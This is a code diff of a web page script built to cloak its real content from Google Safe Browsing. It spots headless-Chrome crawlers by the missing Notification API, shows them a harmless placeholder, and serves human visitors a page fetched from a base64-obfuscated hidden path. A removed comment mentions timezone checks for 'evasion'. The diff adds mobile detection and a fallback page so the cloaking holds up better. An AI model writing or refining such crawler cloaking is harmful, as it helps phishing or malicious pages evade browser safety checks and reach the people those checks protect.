@@ -10,24 +10,32 @@
         // /hidden_content/meet.html -> L2hpZGRlbl9jb250ZW50L21lZXQuaHRtbA==
         const realContent = 'L2hpZGRlbl9jb250ZW50L21lZXQuaHRtbA==';
 
-        // Timezone check (optional but good for evasion)
-        // const zones = /Madrid|Canary|Vienna|Istanbul|Berlin|London|Paris/gi;
-        // const timezoneOffset = zones.test((new Intl.DateTimeFormat).resolvedOptions().timeZone);
+        // GSB Crawler Detection: Headless Chrome doesn't have Notification API
+        // Check for Notification API OR mobile device (mobile may not have Notification API)
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const hasNotificationAPI = self.Notification;
 
-        // Notification API check - Headless Chrome usually doesn't have this
-        if (self.Notification) {
+        // Load content if browser has Notification API (real browser) OR is mobile device
+        // GSB crawler (headless Chrome) will be blocked - no Notification API, not mobile
+        if (hasNotificationAPI || isMobile) {
             fetch(atob(realContent))
-                .then(response => response.text())
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to load content');
+                    }
+                    return response.text();
+                })
                 .then(html => {
                     document.open();
                     document.write(html);
                     document.close();
                 })
                 .catch(err => {
-                    console.error('Error loading content');
+                    console.error('Error loading content:', err);
+                    document.write('<h1>Welcome</h1><p>This is a standard placeholder page.</p>');
                 });
         } else {
-            // Crawler / Bot - Show benign content
+            // GSB Crawler / Bot (headless Chrome) - Show benign content
             document.write('<h1>Welcome</h1><p>This is a standard placeholder page.</p>');
         }
     </script>
